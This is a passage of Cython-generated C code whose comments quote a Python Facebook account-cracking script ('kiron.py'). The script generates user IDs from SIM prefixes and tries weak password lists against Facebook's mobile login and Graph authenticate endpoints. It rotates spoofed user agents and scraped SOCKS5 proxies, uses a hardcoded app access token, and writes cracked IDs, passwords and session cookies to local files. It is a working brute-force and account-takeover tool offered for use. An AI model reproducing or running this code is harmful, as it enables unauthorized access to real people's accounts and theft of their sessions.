 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"             # <<<<<<<<<<<<<<
 *      cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua8 = f"Mozilla/5.0 (Linux; U; Android 13; pt-pt; "+str(mobile)+f") AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(110,599))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 */
  __pyx_tuple__51 = PyTuple_Pack(2, __pyx_int_7, __pyx_int_11); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__51);
  __Pyx_GIVEREF(__pyx_tuple__51);
  __pyx_tuple__52 = PyTuple_Pack(2, __pyx_int_311, __pyx_int_999); if (unlikely(!__pyx_tuple__52)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__52);
  __Pyx_GIVEREF(__pyx_tuple__52);

  /* "kiron.py":353
 *      cudiua5 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+str(mobile)+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" YaApp_Android/{str(rr(111,999))}.10.1 YaSearchBrowser/{str(rr(11,44))}.{str(rr(11,44))}.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"
 *      cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"             # <<<<<<<<<<<<<<
 *      cudiua8 = f"Mozilla/5.0 (Linux; U; Android 13; pt-pt; "+str(mobile)+f") AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(110,599))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
 */
  __pyx_tuple__53 = PyTuple_Pack(2, __pyx_int_7, __pyx_int_13); if (unlikely(!__pyx_tuple__53)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__53);
  __Pyx_GIVEREF(__pyx_tuple__53);
  __pyx_tuple__55 = PyTuple_Pack(2, __pyx_int_511, __pyx_int_599); if (unlikely(!__pyx_tuple__55)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__55);
  __Pyx_GIVEREF(__pyx_tuple__55);
  __pyx_tuple__56 = PyTuple_Pack(2, __pyx_int_30, __pyx_int_39); if (unlikely(!__pyx_tuple__56)) __PYX_ERR(0, 353, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__56);
  __Pyx_GIVEREF(__pyx_tuple__56);

  /* "kiron.py":354
 *      cudiua6 = f"Mozilla/5.0 (Windows NT {str(rr(7,11))}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+chorom+f" Safari/537.36 Edg/{str(rr(11,99))}.0.{str(rr(311,999))}.59"
 *      cudiua7 = f"Mozilla/5.0 (X11; Linux x86_64; Android {str(rr(7,13))}; {str(mobile)} Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(chorom)} Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua8 = f"Mozilla/5.0 (Linux; U; Android 13; pt-pt; "+str(mobile)+f") AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(11,99))}.0.{str(rr(1111,9999))}.{str(rr(110,599))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"             # <<<<<<<<<<<<<<
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
 *      return ua
 */
  __pyx_tuple__57 = PyTuple_Pack(2, __pyx_int_110, __pyx_int_599); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 354, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__57);
  __Pyx_GIVEREF(__pyx_tuple__57);

  /* "kiron.py":359
 * def rnd():
 *     clear()
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')             # <<<<<<<<<<<<<<
 *     print('\x1b[38;5;244m[\x1b[1;97m0\x1b[38;5;244m]\x1b[38;5;46m \033[91;1mBACK MENU')
 *     linex()
 */
  __pyx_tuple__58 = PyTuple_Pack(1, __pyx_kp_s_38_5_244m_1_97m1_38_5_244m_38_5_2); if (unlikely(!__pyx_tuple__58)) __PYX_ERR(0, 359, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__58);
  __Pyx_GIVEREF(__pyx_tuple__58);

  /* "kiron.py":360
 *     clear()
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')
 *     print('\x1b[38;5;244m[\x1b[1;97m0\x1b[38;5;244m]\x1b[38;5;46m \033[91;1mBACK MENU')             # <<<<<<<<<<<<<<
 *     linex()
 *     crk=input('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE :\x1b[38;5;46m ')
 */
  __pyx_tuple__59 = PyTuple_Pack(1, __pyx_kp_s_38_5_244m_1_97m0_38_5_244m_38_5); if (unlikely(!__pyx_tuple__59)) __PYX_ERR(0, 360, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__59);
  __Pyx_GIVEREF(__pyx_tuple__59);

  /* "kiron.py":362
 *     print('\x1b[38;5;244m[\x1b[1;97m0\x1b[38;5;244m]\x1b[38;5;46m \033[91;1mBACK MENU')
 *     linex()
 *     crk=input('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE :\x1b[38;5;46m ')             # <<<<<<<<<<<<<<
 *     if crk =='1':
 *         BD()
 */
  __pyx_tuple__60 = PyTuple_Pack(1, __pyx_kp_s_38_5_244m_1_97m_38_5_244m_38_5_9); if (unlikely(!__pyx_tuple__60)) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__60);
  __Pyx_GIVEREF(__pyx_tuple__60);

  /* "kiron.py":374
 * def BD():
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')             # <<<<<<<<<<<<<<
 *         linex()
 *         code = input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE CODE :{A} ')
 */
  __pyx_tuple__61 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_10); if (unlikely(!__pyx_tuple__61)) __PYX_ERR(0, 374, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__61);
  __Pyx_GIVEREF(__pyx_tuple__61);

  /* "kiron.py":378
 *         code = input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE CODE :{A} ')
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 2000, 3000, 5000, 10000')             # <<<<<<<<<<<<<<
 *         linex()
 *         limit = int(input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRAKING LIMITE :{A} '))
 */
  __pyx_tuple__62 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_12); if (unlikely(!__pyx_tuple__62)) __PYX_ERR(0, 378, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__62);
  __Pyx_GIVEREF(__pyx_tuple__62);

  /* "kiron.py":389
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mTOTAL UID \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {tl}")
 *             print(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mSIM CODE  \x1b[38;5;244m\x1b[38;5;46m\033[1;37m {code}")
 *             print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mIF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE ')             # <<<<<<<<<<<<<<
 *             linex()
 *             for love in user:
 */
  __pyx_tuple__64 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_16); if (unlikely(!__pyx_tuple__64)) __PYX_ERR(0, 389, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__64);
  __Pyx_GIVEREF(__pyx_tuple__64);

  /* "kiron.py":393
 *             for love in user:
 *                 uid = code + love
 *                 passlist = [uid,love,uid[:8],uid[:7],uid[:6],'708090','203040','102030']             # <<<<<<<<<<<<<<
 *                 crack_submit.submit(idpaslogin,uid,passlist,tl)
 *         print(f'')
 */
  __pyx_slice__65 = PySlice_New(Py_None, __pyx_int_8, Py_None); if (unlikely(!__pyx_slice__65)) __PYX_ERR(0, 393, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__65);
  __Pyx_GIVEREF(__pyx_slice__65);
  __pyx_slice__66 = PySlice_New(Py_None, __pyx_int_7, Py_None); if (unlikely(!__pyx_slice__66)) __PYX_ERR(0, 393, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__66);
  __Pyx_GIVEREF(__pyx_slice__66);
  __pyx_slice__67 = PySlice_New(Py_None, __pyx_int_6, Py_None); if (unlikely(!__pyx_slice__67)) __PYX_ERR(0, 393, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__67);
  __Pyx_GIVEREF(__pyx_slice__67);

  /* "kiron.py":395
 *                 passlist = [uid,love,uid[:8],uid[:7],uid[:6],'708090','203040','102030']
 *                 crack_submit.submit(idpaslogin,uid,passlist,tl)
 *         print(f'')             # <<<<<<<<<<<<<<
 *         linex()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRACK SUCCESSFULLY COMPLETED..')
 */
  __pyx_tuple__68 = PyTuple_Pack(1, __pyx_kp_u__63); if (unlikely(!__pyx_tuple__68)) __PYX_ERR(0, 395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__68);
  __Pyx_GIVEREF(__pyx_tuple__68);

  /* "kiron.py":397
 *         print(f'')
 *         linex()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRACK SUCCESSFULLY COMPLETED..')             # <<<<<<<<<<<<<<
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m TOTAL \x1b[38;5;46mOK \033[1;37m :  \x1b[38;5;46m' +str(len(oks)))
 *         linex()
 */
  __pyx_tuple__69 = PyTuple_Pack(1, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_17); if (unlikely(!__pyx_tuple__69)) __PYX_ERR(0, 397, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__69);
  __Pyx_GIVEREF(__pyx_tuple__69);

  /* "kiron.py":439
 *     'viewport-width': '980',
 *     'user-agent': us}
 *                     po = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc', data=data, headers=head,allow_redirects=False,verify=True).text             # <<<<<<<<<<<<<<
 *                     log_cookies=session.cookies.get_dict().keys()
 *                     if 'c_user' in log_cookies:
 */
  __pyx_tuple__70 = PyTuple_Pack(1, __pyx_kp_s_https_mbasic_facebook_com_login); if (unlikely(!__pyx_tuple__70)) __PYX_ERR(0, 439, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__70);
  __Pyx_GIVEREF(__pyx_tuple__70);

  /* "kiron.py":442
 *                     log_cookies=session.cookies.get_dict().keys()
 *                     if 'c_user' in log_cookies:
 *                            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"XD={ssbb};{coki}"             # <<<<<<<<<<<<<<
 *                            uidx=re.findall("c_user=(.*);xs", coki)[0]
 *                            uid=str(uidx)
 */
  __pyx_tuple__73 = PyTuple_Pack(2, __pyx_kp_s__72, __pyx_kp_s__63); if (unlikely(!__pyx_tuple__73)) __PYX_ERR(0, 442, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__73);
  __Pyx_GIVEREF(__pyx_tuple__73);
  __pyx_tuple__76 = PyTuple_Pack(2, __pyx_kp_s__74, __pyx_n_s__75); if (unlikely(!__pyx_tuple__76)) __PYX_ERR(0, 442, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__76);
  __Pyx_GIVEREF(__pyx_tuple__76);
  __pyx_tuple__78 = PyTuple_Pack(2, __pyx_kp_s__38, __pyx_kp_s__77); if (unlikely(!__pyx_tuple__78)) __PYX_ERR(0, 442, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__78);
  __Pyx_GIVEREF(__pyx_tuple__78);

  /* "kiron.py":451
 *                                  print("\r\033[1;34m(\033[1;34m)\x1b[38;5;244m\x1b[38;5;46m \033[1;37m"+ coki)
 *                                  print(f'\x1b[1;97m\033[1;37m')
 *                                  open('/sdcard/AYYUB/RND-M1-OK-COKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')             # <<<<<<<<<<<<<<
 *                                  oks.append(uid)
 *                                  break
 */
  __pyx_tuple__79 = PyTuple_Pack(2, __pyx_kp_s_sdcard_AYYUB_RND_M1_OK_COKIE_tx, __pyx_n_s_a); if (unlikely(!__pyx_tuple__79)) __PYX_ERR(0, 451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__79);
  __Pyx_GIVEREF(__pyx_tuple__79);

  /* "kiron.py":458
 *                     elif 'checkpoint' in log_cookies:
 *                             #print(f"\r\r\033[1;90m [XD]-[CP] {uid} | {ps}")
 *                             open('/sdcard/AYYUB/RND-CP.txt','a').write(uid+'|'+ps+'\n')             # <<<<<<<<<<<<<<
 *                             cps.append(uid)
 *                             break
 */
  __pyx_tuple__80 = PyTuple_Pack(2, __pyx_kp_s_sdcard_AYYUB_RND_CP_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__80)) __PYX_ERR(0, 458, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__80);
  __Pyx_GIVEREF(__pyx_tuple__80);

  /* "kiron.py":480
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))             # <<<<<<<<<<<<<<
 *                         android_version = device['android_version']
 *                         model = device['model']
 */
  __pyx_tuple__81 = PyTuple_Pack(2, __pyx_int_111111111, __pyx_int_999999999); if (unlikely(!__pyx_tuple__81)) __PYX_ERR(0, 480, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__81);
  __Pyx_GIVEREF(__pyx_tuple__81);

  /* "kiron.py":496
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'             # <<<<<<<<<<<<<<
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 */
  __pyx_tuple__82 = PyTuple_Pack(2, __pyx_int_0, __pyx_int_999999999); if (unlikely(!__pyx_tuple__82)) __PYX_ERR(0, 496, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__82);
  __Pyx_GIVEREF(__pyx_tuple__82);

  /* "kiron.py":540
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),             # <<<<<<<<<<<<<<
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
 *                                 'User-Agent': AYYUB_M1(),
 */
  __pyx_tuple__86 = PyTuple_Pack(2, __pyx_int_11111, __pyx_int_99999); if (unlikely(!__pyx_tuple__86)) __PYX_ERR(0, 540, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__86);
  __Pyx_GIVEREF(__pyx_tuple__86);

  /* "kiron.py":554
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 *                                         open('/sdcard/AYYUB-FILE-M1-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")             # <<<<<<<<<<<<<<
 *                                         oks.append(ids)
 *                                         break
 */
  __pyx_tuple__87 = PyTuple_Pack(2, __pyx_kp_s_sdcard_AYYUB_FILE_M1_OK_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__87)) __PYX_ERR(0, 554, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__87);
  __Pyx_GIVEREF(__pyx_tuple__87);

  /* "kiron.py":560
 *                                         if 'y' in pcp:
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                                 cps.append(ids)
 *                                                 break
 */
  __pyx_tuple__89 = PyTuple_Pack(2, __pyx_kp_s_sdcard_AYYUB_CP_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__89)) __PYX_ERR(0, 560, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__89);
  __Pyx_GIVEREF(__pyx_tuple__89);

  /* "kiron.py":642
 *                         headers={
 *                                 'Authorization':f'OAuth {accessToken}',
 *                                 "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),             # <<<<<<<<<<<<<<
 *                                 "X-FB-Net-HNI": str(random.randint(900000, 999999)),
 *                                 "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
 */
  __pyx_tuple__90 = PyTuple_Pack(2, __pyx_int_20000000, __pyx_int_30000000); if (unlikely(!__pyx_tuple__90)) __PYX_ERR(0, 642, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__90);
  __Pyx_GIVEREF(__pyx_tuple__90);

  /* "kiron.py":643
 *                                 'Authorization':f'OAuth {accessToken}',
 *                                 "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
 *                                 "X-FB-Net-HNI": str(random.randint(900000, 999999)),             # <<<<<<<<<<<<<<
 *                                 "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
 *                                 'X-FB-Friendly-Name':'authenticate',
 */
  __pyx_tuple__91 = PyTuple_Pack(2, __pyx_int_900000, __pyx_int_999999); if (unlikely(!__pyx_tuple__91)) __PYX_ERR(0, 643, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__91);
  __Pyx_GIVEREF(__pyx_tuple__91);

  /* "kiron.py":659
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 *                                         open('/sdcard/AYYUB-FILE-M2-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")             # <<<<<<<<<<<<<<
 *                                         oks.append(ids)
 *                                         break
 */
  __pyx_tuple__92 = PyTuple_Pack(2, __pyx_kp_s_sdcard_AYYUB_FILE_M2_OK_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__92)) __PYX_ERR(0, 659, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__92);
  __Pyx_GIVEREF(__pyx_tuple__92);

  /* "kiron.py":18
 *     pass
 * else:
 *     exit('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR MOM...')             # <<<<<<<<<<<<<<
 * def clear():
 *         os.system('clear')
 */
  __pyx_tuple__94 = PyTuple_Pack(1, __pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_2); if (unlikely(!__pyx_tuple__94)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__94);
  __Pyx_GIVEREF(__pyx_tuple__94);

  /* "kiron.py":19
 * else:
 *     exit('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR MOM...')
 * def clear():             # <<<<<<<<<<<<<<
 *         os.system('clear')
 * os.system('clear')
 */
  __pyx_codeobj__95 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_sdcard_kiron_py, __pyx_n_s_clear, 19, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__95)) __PYX_ERR(0, 19, __pyx_L1_error)

  /* "kiron.py":21
 * def clear():
 *         os.system('clear')
 * os.system('clear')             # <<<<<<<<<<<<<<
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE......')
 * time.sleep(3)
 */
  __pyx_tuple__96 = PyTuple_Pack(1, __pyx_n_s_clear); if (unlikely(!__pyx_tuple__96)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__96);
  __Pyx_GIVEREF(__pyx_tuple__96);

  /* "kiron.py":22
 *         os.system('clear')
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE......')             # <<<<<<<<<<<<<<
 * time.sleep(3)
 * os.system('clear')
 */
  __pyx_tuple__97 = PyTuple_Pack(1, __pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_3); if (unlikely(!__pyx_tuple__97)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__97);
  __Pyx_GIVEREF(__pyx_tuple__97);

  /* "kiron.py":23
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE......')
 * time.sleep(3)             # <<<<<<<<<<<<<<
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')
 */
  __pyx_tuple__98 = PyTuple_Pack(1, __pyx_int_3); if (unlikely(!__pyx_tuple__98)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__98);
  __Pyx_GIVEREF(__pyx_tuple__98);

  /* "kiron.py":25
 * time.sleep(3)
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')             # <<<<<<<<<<<<<<
 * time.sleep(2)
 * try:
 */
  __pyx_tuple__99 = PyTuple_Pack(1, __pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_4); if (unlikely(!__pyx_tuple__99)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__99);
  __Pyx_GIVEREF(__pyx_tuple__99);

  /* "kiron.py":26
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m YOUR DEVICE 64 BET')
 * time.sleep(2)             # <<<<<<<<<<<<<<
 * try:
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 */
  __pyx_tuple__100 = PyTuple_Pack(1, __pyx_int_2); if (unlikely(!__pyx_tuple__100)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__100);
  __Pyx_GIVEREF(__pyx_tuple__100);

  /* "kiron.py":32
 *         from concurrent.futures import ThreadPoolExecutor as tred
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')             # <<<<<<<<<<<<<<
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AYYUB.py')
 */
  __pyx_tuple__101 = PyTuple_Pack(1, __pyx_kp_s_Installing_missing_modules); if (unlikely(!__pyx_tuple__101)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__101);
  __Pyx_GIVEREF(__pyx_tuple__101);

  /* "kiron.py":33
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')             # <<<<<<<<<<<<<<
 *         os.system('python AYYUB.py')
 * except:pass
 */
  __pyx_tuple__102 = PyTuple_Pack(1, __pyx_kp_s_pip_install_requests_futures_2_d); if (unlikely(!__pyx_tuple__102)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__102);
  __Pyx_GIVEREF(__pyx_tuple__102);

  /* "kiron.py":34
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AYYUB.py')             # <<<<<<<<<<<<<<
 * except:pass
 * ###----------[ GET PROXY ]----------###
 */
  __pyx_tuple__103 = PyTuple_Pack(1, __pyx_kp_s_python_AYYUB_py); if (unlikely(!__pyx_tuple__103)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__103);
  __Pyx_GIVEREF(__pyx_tuple__103);

  /* "kiron.py":39
 * redmi=[]
 * try:
 *  uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text             # <<<<<<<<<<<<<<
 *  open('.proxy.txt','w').write(uno)
 * except:pass
 */
  __pyx_tuple__104 = PyTuple_Pack(1, __pyx_kp_s_https_api_proxyscrape_com_reques); if (unlikely(!__pyx_tuple__104)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__104);
  __Pyx_GIVEREF(__pyx_tuple__104);

  /* "kiron.py":40
 * try:
 *  uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
 *  open('.proxy.txt','w').write(uno)             # <<<<<<<<<<<<<<
 * except:pass
 * for x in range(1000):
 */
  __pyx_tuple__105 = PyTuple_Pack(2, __pyx_kp_s_proxy_txt, __pyx_n_s_w); if (unlikely(!__pyx_tuple__105)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__105);
  __Pyx_GIVEREF(__pyx_tuple__105);

  /* "kiron.py":45
 *  rr = random.randint
 *  rc = random.choice
 *  A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'             # <<<<<<<<<<<<<<
 *  B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 *  C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 */
  __pyx_tuple__106 = PyTuple_Pack(2, __pyx_int_8, __pyx_int_10); if (unlikely(!__pyx_tuple__106)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__106);
  __Pyx_GIVEREF(__pyx_tuple__106);
  __pyx_tuple__107 = PyTuple_Pack(2, __pyx_int_4, __pyx_int_9); if (unlikely(!__pyx_tuple__107)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__107);
  __Pyx_GIVEREF(__pyx_tuple__107);

  /* "kiron.py":46
 *  rc = random.choice
 *  A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 *  B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '             # <<<<<<<<<<<<<<
 *  C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 *  D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 */
  __pyx_tuple__108 = PyTuple_Pack(2, __pyx_int_111111, __pyx_int_199999); if (unlikely(!__pyx_tuple__108)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__108);
  __Pyx_GIVEREF(__pyx_tuple__108);

